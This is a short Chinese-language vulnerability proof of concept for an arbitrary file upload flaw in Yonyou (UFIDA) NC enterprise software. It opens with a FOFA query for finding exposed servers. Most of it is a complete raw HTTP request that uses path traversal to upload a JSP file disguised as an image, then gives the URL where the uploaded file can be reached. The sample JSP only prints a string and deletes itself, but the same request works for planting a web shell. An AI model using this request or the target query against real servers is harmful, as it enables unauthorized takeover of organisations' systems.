**fofa**

```
app="用友-UFIDA-NC"
```

**一、漏洞简述**

用友NC以“全球化集团管控、行业化解决方案、全程化电子商务、平台化应用集成”的管理业务理念而设计，采用J2EE架构和先进开放的集团级开发平台UAP，形成了集团管控8大领域15大行业68个细分行业的解决方案，是中国大企业集团管理信息化应用系统的首选。其接口/uploadControl/uploadFile存在任意文件上传漏洞，攻击者可通过上传恶意木马，控制服务器。

**二、漏洞检测poc**

```yaml

POST /mp/initcfg/../uploadControl/uploadFile HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
Connection: close
Content-Length: 370

------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="file"; filename="sys_log.jsp"
Content-Type: image/jpeg

<% out.println("HelloWorldTest");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundarygcflwtei
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundarygcflwtei--
```

/mp/uploadFileDir/sys_log.jsp